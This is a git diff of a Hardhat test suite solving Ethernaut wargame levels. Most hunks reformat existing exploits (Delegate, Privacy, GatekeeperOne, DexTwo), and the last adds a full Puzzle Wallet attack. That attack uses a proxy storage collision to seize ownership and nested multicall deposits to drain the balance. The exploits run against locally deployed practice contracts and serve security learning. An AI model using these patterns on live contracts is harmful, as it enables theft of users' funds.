@@ -1,18 +1,17 @@
 const { getContractAddress } = require("@ethersproject/address");
-let chaiAsPromised           = require("chai-as-promised");
-const chai                   = require("chai");
-const { assert, expect }     = chai;
+let chaiAsPromised = require("chai-as-promised");
+const chai = require("chai");
+const { assert, expect } = chai;
 chai.use(chaiAsPromised);
 
 describe("Ethernaut", function () {
 	let owner, user, hacker = null;
 	const invalid           = "0x0000000000000000000000000000000000000000";
 	const amount            = ethers.parseEther("0.00001");
-	const maxSupply         = ethers.parseEther("10");
 
 	before(async () => {
-        [owner, user, hacker] = await ethers.getSigners();
-    });
+		[owner, user, hacker] = await ethers.getSigners();
+	});
 
 	describe("Level 0 - Instance", async () => {
 		it("Exploit", async () => {
@@ -77,7 +76,7 @@ describe("Ethernaut", function () {
 	describe("Level 6 - Delegate", async () => {
 		it("Exploit", async () => {
 			const contract = await ethers.deployContract("Delegate", [owner]);
-			await hacker.sendTransaction({ from: hacker, to: contract, data: ethers.keccak256(ethers.toUtf8Bytes("pwn()")) }) // trigger the fallback() function to set the hacker as the new owner
+			await hacker.sendTransaction({ from: hacker, to: contract, data: ethers.keccak256(ethers.toUtf8Bytes("pwn()")) }); // trigger the fallback() function to set the hacker as the new owner
 			const ownerCurrent = await contract.owner();
 			expect(ownerCurrent).to.equal(hacker, "Failed to pass level 6."); // become the owner to pass the level
 		});
@@ -141,15 +140,15 @@ describe("Ethernaut", function () {
 	describe("Level 12 - Privacy", async () => {
 		it("Exploit", async () => {
 			const contract = await ethers.deployContract("Privacy", [[ // bytes32 array is stored in the contract storage which is public
-			ethers.encodeBytes32String("ether"), // 32 bytes = 64 length / 2 hex chars
-			ethers.encodeBytes32String("naut"),
-			ethers.encodeBytes32String("12") // this is the key we need
-		]]);
-		// contract storage consists of multiple 32-byte slots where smaller values are grouped together to fit into one slot
-		const key = await ethers.provider.getStorage(contract, 5); // retrieve the key from the contract storage
-		await contract.unlock(key.slice(0, 34)); // convert / trim the key to bytes16 value
-		const lockedCurrent = await contract.locked();
-		assert(!lockedCurrent, "Failed to pass level 12."); // unlock to pass the level
+				ethers.encodeBytes32String("ether"), // 32 bytes = 64 length / 2 hex chars
+				ethers.encodeBytes32String("naut"),
+				ethers.encodeBytes32String("12") // this is the key we need
+			]]);
+			// contract storage consists of multiple 32-byte slots where smaller values are grouped together to fit into one slot
+			const key = await ethers.provider.getStorage(contract, 5); // retrieve the key from the contract storage
+			await contract.unlock(key.slice(0, 34)); // convert / trim the key to bytes16 value
+			const lockedCurrent = await contract.locked();
+			assert(!lockedCurrent, "Failed to pass level 12."); // unlock to pass the level
 		});
 	});
 
@@ -164,7 +163,7 @@ describe("Ethernaut", function () {
 					await exploit.connect(hacker).run(contract.target, { from: hacker, gas: 800000 + i });
 					// console.log(i); // required gas is 800000 + 15628 = 815628
 					break;
-				} catch (err) {}
+				} catch (err) { }
 			}
 			const entrantCurrent = await contract.entrant();
 			expect(entrantCurrent).to.equal(hacker, "Failed to pass level 13."); // become the entrant to pass the level
@@ -314,7 +313,7 @@ describe("Ethernaut", function () {
 			await token_2.connect(owner).transferFrom(owner, dex, 100);
 			// --------------------
 			const exploit_1 = await ethers.deployContract("DexTwoExploit", ["Exploit 1", "E1", 200], { signer: hacker }); // create two different ERC20 exploit tokens
-			const exploit_2 = await ethers.deployContract("DexTwoExploit", [ "Exploit 2", "E2", 200], { signer: hacker });
+			const exploit_2 = await ethers.deployContract("DexTwoExploit", ["Exploit 2", "E2", 200], { signer: hacker });
 
 			await exploit_1.connect(hacker).approve(hacker, ethers.MaxUint256);
 			await exploit_2.connect(hacker).approve(hacker, ethers.MaxUint256);
@@ -327,7 +326,7 @@ describe("Ethernaut", function () {
 
 			await dex.connect(hacker).swap(exploit_1, token_1, 100);
 			await dex.connect(hacker).swap(exploit_2, token_2, 100);
-			
+
 			const balanceCurrentToken1 = await dex.balanceOf(token_1, dex);
 			const balanceCurrentToken2 = await dex.balanceOf(token_2, dex);
 			expect(balanceCurrentToken1).to.equal(0, "Failed to pass level 23."); // drain all of the tokens to pass the level
@@ -337,22 +336,39 @@ describe("Ethernaut", function () {
 
 	describe("Level 24 - Puzzle", async () => {
 		it("Exploit", async () => {
-			const implementationFactory = await ethers.getContractFactory("PuzzleWallet");
-    		const implementation = await implementationFactory.connect(owner).deploy();
-			await implementation.waitForDeployment();
+			const implementationFactory = await ethers.getContractFactory("PuzzleWallet"); // implementation contract
+			const implementation = await implementationFactory.deploy();
 
-			const initialize = implementation.interface.encodeFunctionData("init", [1000]);
+			const dataInitialize = implementation.interface.encodeFunctionData("init", [amount * BigInt(1000)]); // maximum balance will be overwritten by the proxy contract due to the storage collision
 
 			const proxyFactory = await ethers.getContractFactory("PuzzleProxy");
-    		const proxy = await proxyFactory.connect(owner).deploy(owner, implementation, initialize);
-			await proxy.waitForDeployment();
-			console.log(proxy);
+			const proxy = await proxyFactory.deploy(owner, implementation, dataInitialize);
 
 			const proxyImplementation = implementationFactory.attach(proxy);
 			await proxyImplementation.connect(owner).addToWhitelist(owner);
-			await proxyImplementation.connect(owner).setMaxBalance(1000);
-			const maxBalance = await proxyImplementation.maxBalance();
-			console.log(maxBalance);
+			await proxyImplementation.connect(owner).deposit({ value: amount * BigInt(2) }); // deposit some ETH to the target's contract
+
+			await proxy.proposeNewAdmin(hacker); // overwriting the owner of the implementation contract due to the storage collision
+			const ownerCurrent = await proxyImplementation.owner();
+			expect(ownerCurrent).to.equal(hacker, "Failed to pass level 24."); // become the owner of the implementation contract to pass the level
+
+			await proxyImplementation.connect(hacker).addToWhitelist(hacker);
+			const dataDeposit = [
+				implementation.interface.encodeFunctionData("deposit")
+			];
+			const dataMulticall = [
+				dataDeposit[0],
+				implementation.interface.encodeFunctionData("multicall", [dataDeposit]),
+				implementation.interface.encodeFunctionData("multicall", [dataDeposit])
+			]
+			await proxyImplementation.connect(hacker).multicall(dataMulticall, { signer: hacker, value: amount }); // sending only 0.00001 ETH but recursively bumping balances mapping to 0.00003 ETH (total target's contract balance)
+			await proxyImplementation.connect(hacker).execute(hacker, amount * BigInt(3), "0x")
+			const balanceCurrent = await ethers.provider.getBalance(proxyImplementation);
+			expect(balanceCurrent).to.equal(0, "Failed to pass level 24."); // withdraw the whole balance from the proxy contract to pass the level
+
+			await proxyImplementation.connect(owner).setMaxBalance(hacker.address); // overwriting the admin of the proxy contract due to the storage collision
+			const adminCurrent = await proxy.admin();
+			expect(adminCurrent).to.equal(hacker, "Failed to pass level 24.");
 		});
 	});
 });
